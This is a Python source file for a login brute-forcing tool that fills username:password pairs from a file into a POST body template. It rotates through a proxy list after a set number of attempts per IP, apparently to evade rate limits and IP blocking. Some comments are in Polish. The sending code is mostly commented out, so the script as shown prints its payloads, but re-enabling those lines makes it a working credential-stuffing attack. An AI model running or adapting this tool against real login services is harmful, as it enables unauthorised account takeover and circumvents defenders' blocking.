import argparse
import sys, json, os, re
from packages.utils import (
    collect_input_args,
    validate_input_args,
    unpack_variables_from_json,
)
import urllib.request, urllib.error, urllib.response, urllib.parse
from packages.config import *


class BruteforcerG:
    def __init__(
        self, url, form_scheme, credentials_file, proxies, attemps_per_ip
    ) -> None:
        self.url = url
        self.form_scheme = form_scheme
        with open(credentials_file) as f:
            self.credentials_list = [
                (line.split(":")[0], line.split(":")[1].rstrip()) for line in f
            ]
        with open(proxies) as f:
            self.proxies = [line.rstrip() for line in f]
        self.attemps_per_ip = attemps_per_ip

    def proxy_rotating_attack(self, index, data_bytes):
        proxy_handler = urllib.request.ProxyHandler(
            {"http": self.proxies[index], "https": self.proxies[index]}
        )
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [("User-agent", "Mozilla/5.0")]
        urllib.request.install_opener(opener)
        request = urllib.request.Request(self.url, data=data_bytes)
        with urllib.request.urlopen(request, timeout=10) as response:
            print(response.status)

    def perform_bruteforce(self):
        counter = 0
        index = 0
        json_tool = JsonData(self.form_scheme)
        if self.attemps_per_ip * len(self.proxies) < len(self.credentials_list):
            print(
                f"It's too much answers (`{len(self.credentials_list)}`) to check for `{len(self.proxies)}` IPs! Incease the number of attemps per one IP or decrease the number of answers"
            )
        else:
            for credentials in self.credentials_list:
                if counter < self.attemps_per_ip:
                    data_to_post = json_tool.create_json_to_injection(credentials)
                    data_bytes = str.encode(json.dumps(data_to_post))
                    print(
                        f"IP: {self.proxies[index]}, Data: {json.dumps(data_to_post)}"
                    )
                    # self.proxy_rotating_attack(index, data_bytes)
                    # jeśli się uda to git
                    # jeśli nie to zmień IP na następny
                    counter = counter + 1
                else:
                    index = index + 1
                    counter = 0


class Bruteforcer:
    def __init__(
        self,
        url,
        data_scheme_file_raw,
        credentials_file_raw,
        proxies_file_raw,
        attemps_per_ip,
    ) -> None:
        def is_empty(input_file, file_name):
            if not input_file:
                print(f"File: `{file_name}` is empty! Adios!")
                return True
            return False

        def validate_credentials_file(data_scheme, credentials_file):
            # jeżeli zmienna jest duplikowana to i tak zmieniane są wszystkie na raz
            variables_to_injection = list(
                dict.fromkeys(re.findall("\$\{[a-zA-Z]+}", data_scheme))
            )
            len_variables_to_injection = len(variables_to_injection)
            credentials = []
            fields_cnt = credentials_file[0].count(":") + 1
            if fields_cnt > len_variables_to_injection:
                print(
                    f"In credentials file is `{fields_cnt}` fields, and it's more than is needed in API data scheme (`{len_variables_to_injection}`)! I'll only use the first `{len_variables_to_injection}` columns from the credentials file"
                )
            for line in credentials_file:
                # pomija puste linijki
                if line.strip():
                    current_fields_cnt = line.count(":") + 1
                    # debug
                    # print(
                    #     f"Fields in line `{line}`credentials file: `{current_fields_cnt}`, Variables in your data to injection file: {len(variables_to_injection)}"
                    # )
                    if current_fields_cnt == 0:
                        continue
                    elif current_fields_cnt != fields_cnt:
                        print(
                            f"Line `{line.rstrip()}` differs than other lines in credentials file"
                        )
                        sys.exit(-1)
                    elif current_fields_cnt >= len_variables_to_injection:
                        credentials.append(
                            tuple(line.split(":")[i] for i in range(fields_cnt))
                        )
                    else:
                        print(
                            "Dopasuj liczbę danych wejściowych do liczby zmiennych w pliku txt"
                        )
                        sys.exit(-1)
                else:
                    # warning
                    print("An empty line in credentials file. Skipped!")
            return variables_to_injection, credentials

        self.url = url
        with open(data_scheme_file_raw, "r") as data_scheme_file:
            self.data_scheme = data_scheme_file.read().rstrip()
            if is_empty(self.data_scheme, data_scheme_file_raw):
                sys.exit(-1)
        print(len(re.findall("\$\{(\w)+}", self.data_scheme)))
        with open(credentials_file_raw) as credentials_file:
            credentials_list = credentials_file.readlines()
            if is_empty(credentials_list, credentials_file_raw):
                sys.exit(-1)
            (
                self.variables_to_injection,
                self.credentials_list,
            ) = validate_credentials_file(self.data_scheme, credentials_list)
        self.attemps_per_ip = attemps_per_ip
        with open(proxies_file_raw) as proxies_file:
            self.proxies = [line.rstrip() for line in proxies_file if line.strip()]
            print(self.proxies)
            if self.attemps_per_ip * len(self.proxies) < len(self.credentials_list):
                # warning
                print(
                    f"There is too much credentials to check for (`{len(self.credentials_list)}`) for `{self.attemps_per_ip}` trials per `{len(self.proxies)}` IP addresses. Rest of the attemps will be performed with last IP in list `{self.proxies[len(self.proxies)-1]}`"
                )
                while self.attemps_per_ip * len(self.proxies) < len(
                    self.credentials_list
                ):
                    self.proxies.insert(
                        len(self.proxies), self.proxies[len(self.proxies) - 1]
                    )

    def perform_bruteforce(self):
        counter = 0
        index = 0
        for credentials in self.credentials_list:
            data_to_post = self.data_scheme
            for i in range(len(self.variables_to_injection)):
                data_to_post = data_to_post.replace(
                    self.variables_to_injection[i], credentials[i]
                )
            if self.proxies:
                if counter < self.attemps_per_ip:
                    self.proxy_rotating_injection(index, str.encode(data_to_post))
                    # jeśli się uda to git
                    # jeśli nie to zmień IP na następny
                    counter = counter + 1
                else:
                    index = index + 1
                    counter = 0
            else:
                self.standard_injection(str.encode(data_to_post))
        pass

    def proxy_rotating_injection(self, index, data_bytes):
        print(f"IP: `{self.proxies[index]}`, Data: `{data_bytes}`")
        # proxy_handler = urllib.request.ProxyHandler(
        #     {"http": self.proxies[index], "https": self.proxies[index]}
        # )
        # opener = urllib.request.build_opener(proxy_handler)
        # opener.addheaders = [("User-agent", "Mozilla/5.0")]
        # urllib.request.install_opener(opener)
        # request = urllib.request.Request(self.url, data=data_bytes)
        # with urllib.request.urlopen(request, timeout=10) as response:
        #     print(response.status)

    def standard_injection(self, data_bytes):
        print(f"IP: Your IP, Data: `{data_bytes}`")
        # opener = urllib.request.build_opener()
        # opener.addheaders = [("User-agent", "Mozilla/5.0")]
        # urllib.request.install_opener(opener)
        # request = urllib.request.Request(self.url, data=data_bytes)
        # with urllib.request.urlopen(request, timeout=10) as response:
        #     print(response.status)


class JsonData:
    def __init__(self, form_scheme) -> None:
        self.json_scheme = open(form_scheme)

    def create_json_to_injection(self, credentials):
        data_to_post = json.load(self.json_scheme)
        for key in data_to_post:
            for i in range(len(CREDENTIAL_ENVS)):
                if CREDENTIAL_ENVS[i] in data_to_post[key]:
                    data_to_post[key] = unpack_variables_from_json(
                        data_to_post[key], credentials[i]
                    )
        return data_to_post


parser = argparse.ArgumentParser()
args = collect_input_args(parser)
validate_input_args(args)

bruteforce_tool = Bruteforcer(
    args.url, args.data_scheme, args.credentials_file, args.proxies, args.attemps_per_ip
)
bruteforce_tool.perform_bruteforce()
